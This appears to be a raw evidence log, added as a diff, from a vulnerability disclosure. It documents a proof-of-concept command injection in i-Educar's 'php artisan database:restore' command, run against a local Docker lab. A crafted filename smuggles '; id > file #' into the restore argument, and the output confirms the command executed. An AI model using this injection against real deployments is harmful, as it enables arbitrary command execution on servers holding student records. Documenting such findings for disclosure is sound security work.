@@ -1,0 +1,30 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:14.211802+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# lab: /home/pollo/disclosures/i-explorar/lab/i-educar
+# payload filename: '/tmp/i_explorar_missing.sql; id > /tmp/i_explorar_poc01_345740.txt #'
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T php rm -f /tmp/i_explorar_poc01_345740.txt
+
+--- output ---
+(empty)
+--- end output ---
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T php php artisan database:restore i_explorar_poc01 '/tmp/i_explorar_missing.sql; id > /tmp/i_explorar_poc01_345740.txt #'
+
+--- output ---
+DROP DATABASE
+CREATE DATABASE
+NOTICE:  database "i_explorar_poc01" does not exist, skipping
+pg_restore: error: could not open input file "/tmp/i_explorar_missing.sql": No such file or directory
+--- end output ---
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T php cat /tmp/i_explorar_poc01_345740.txt
+
+--- output ---
+uid=1000(ieducar) gid=1000(ieducar) groups=1000(ieducar)
+--- end output ---
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -c 'DROP DATABASE IF EXISTS i_explorar_poc01;'
+
+--- output ---
+DROP DATABASE
+--- end output ---
+# finished_at: 2026-09-11T00:17:16.065850+00:00
